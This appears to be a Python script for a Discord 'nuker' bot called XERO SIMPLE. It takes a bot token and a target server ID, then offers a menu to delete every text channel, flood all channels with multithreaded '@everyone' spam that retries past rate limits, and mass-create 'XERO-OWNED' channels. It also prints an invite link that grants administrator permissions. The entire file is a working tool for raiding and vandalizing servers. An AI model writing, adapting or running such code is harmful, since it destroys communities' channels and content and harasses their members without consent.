import os
import sys
import time
import threading

try:
    import requests
except:
    os.system("pip3 install requests --break-system-packages")
    import requests

os.system("clear")

print("XERO SIMPLE - iSH EDITION")
print("=" * 30)

token = input("BOT TOKEN: ").strip()
if not token:
    print("Token required!")
    sys.exit(1)

print("Checking token...")
try:
    r = requests.get(
        "https://discord.com/api/v10/users/@me",
        headers={"Authorization": "Bot " + token},
        timeout=15
    )
    if r.status_code == 200:
        info = r.json()
        print("Connected as: " + info["username"])
    else:
        print("Invalid token!")
        sys.exit(1)
except Exception as e:
    print("Error: " + str(e))
    sys.exit(1)

class XeroSimple:
    def __init__(self, guild_id, token):
        self.guild_id = guild_id
        self.token = token
        self.spamming = False
        self.spam_count = 0
        self.headers = {"Authorization": "Bot " + self.token}

    def api_call(self, method, url, data=None):
        try:
            if method == "get":
                return requests.get(url, headers=self.headers, timeout=15)
            elif method == "post":
                return requests.post(url, headers=self.headers, json=data, timeout=15)
            elif method == "delete":
                return requests.delete(url, headers=self.headers, timeout=15)
        except:
            return None

    def check_guild(self):
        print("Checking guild...")
        r = self.api_call("get", "https://discord.com/api/v10/guilds/" + self.guild_id)
        if r and r.status_code == 200:
            guild = r.json()
            print("Guild found: " + guild["name"])
            return True
        else:
            print("Bot not in guild or invalid ID!")
            return False

    def get_all_channels(self):
        r = self.api_call("get", "https://discord.com/api/v10/guilds/" + self.guild_id + "/channels")
        if r and r.status_code == 200:
            channels = r.json()
            text_channels = [c for c in channels if c["type"] == 0]
            print("Found " + str(len(text_channels)) + " channels")
            return text_channels
        return []

    def delete_all_channels(self):
        channels = self.get_all_channels()
        if not channels:
            print("No channels found!")
            return
        
        print("Deleting " + str(len(channels)) + " channels...")
        
        deleted = 0
        for i, channel in enumerate(channels, 1):
            r = self.api_call("delete", "https://discord.com/api/v10/channels/" + channel["id"])
            if r and r.status_code == 200:
                deleted += 1
                print("Deleted: " + channel["name"] + " (" + str(i) + "/" + str(len(channels)) + ")")
            time.sleep(0.5)
        
        print("Deleted " + str(deleted) + "/" + str(len(channels)))

    def spam_single_channel(self, channel_id, message):
        while self.spamming:
            try:
                r = self.api_call(
                    "post",
                    "https://discord.com/api/v10/channels/" + channel_id + "/messages",
                    data={"content": message}
                )
                if r and r.status_code == 200:
                    self.spam_count += 1
                elif r and r.status_code == 429:
                    time.sleep(1)
                else:
                    time.sleep(0.5)
            except:
                time.sleep(0.5)

    def spam_all_channels(self, message):
        channels = self.get_all_channels()
        if not channels:
            print("No channels found!")
            return
        
        print("Spamming " + str(len(channels)) + " channels...")
        print("PRESS ENTER TO STOP")
        
        for channel in channels:
            t = threading.Thread(target=self.spam_single_channel, args=(channel["id"], message))
            t.daemon = True
            t.start()

    def start_spam(self, message):
        if self.spamming:
            return
        self.spamming = True
        self.spam_count = 0
        threading.Thread(target=self.spam_all_channels, args=(message,), daemon=True).start()
        while self.spamming:
            sys.stdout.write("\rMessages sent: " + str(self.spam_count))
            sys.stdout.flush()
            time.sleep(1)

    def stop_spam(self):
        self.spamming = False
        print("\nStopped. Total: " + str(self.spam_count))

    def create_channels(self, name, amount):
        print("Creating " + str(amount) + " channels...")
        
        created = 0
        for i in range(amount):
            channel_name = name + "-" + str(i+1) if amount > 1 else name
            r = self.api_call(
                "post",
                "https://discord.com/api/v10/guilds/" + self.guild_id + "/channels",
                data={"name": channel_name, "type": 0}
            )
            if r and r.status_code == 201:
                created += 1
                print("Created: " + channel_name + " (" + str(created) + "/" + str(amount) + ")")
            time.sleep(0.5)
        
        print("Created " + str(created) + "/" + str(amount))

    def get_invite(self):
        r = self.api_call("get", "https://discord.com/api/v10/oauth2/applications/@me")
        if r and r.status_code == 200:
            cid = r.json()["id"]
            return "https://discord.com/oauth2/authorize?client_id=" + cid + "&permissions=8&scope=bot"
        return None

    def menu(self):
        while True:
            os.system("clear")
            print("XERO SIMPLE - TARGET: " + self.guild_id)
            print("=" * 30)
            print("[1] DELETE ALL CHANNELS")
            print("[2] SPAM ALL CHANNELS")
            print("[3] CREATE CHANNELS")
            print("[4] SHOW INVITE LINK")
            print("[5] CHANGE TARGET")
            print("[6] EXIT")
            print("=" * 30)
            
            choice = input("XERO > ")

            if choice == "1":
                confirm = input("ARE YOU SURE? (yes/no): ")
                if confirm.lower() == "yes":
                    self.delete_all_channels()
                input("PRESS ENTER")
                
            elif choice == "2":
                message = input("MESSAGE: ") or "@everyone XERO WAS HERE"
                self.start_spam(message)
                input()
                self.stop_spam()
                
            elif choice == "3":
                name = input("NAME: ") or "XERO-OWNED"
                try:
                    amount = int(input("HOW MANY: "))
                except:
                    amount = 20
                self.create_channels(name, amount)
                input("PRESS ENTER")
                
            elif choice == "4":
                invite = self.get_invite()
                if invite:
                    print("INVITE: " + invite)
                else:
                    print("Failed!")
                input("PRESS ENTER")
                
            elif choice == "5":
                return "change"
                
            elif choice == "6":
                print("BYE!")
                return "exit"

print("Ready!")

while True:
    guild_id = input("GUILD ID (or exit): ").strip()
    
    if guild_id.lower() == "exit":
        print("Goodbye!")
        sys.exit(0)
    
    if not guild_id.isdigit():
        print("Invalid guild ID!")
        continue
    
    xero = XeroSimple(guild_id, token)
    
    if xero.check_guild():
        result = xero.menu()
        if result == "exit":
            sys.exit(0)
    else:
        print("Add bot to guild first!")
        invite = xero.get_invite()
        if invite:
            print("Invite link: " + invite)
        print("")
ENDOFFILE
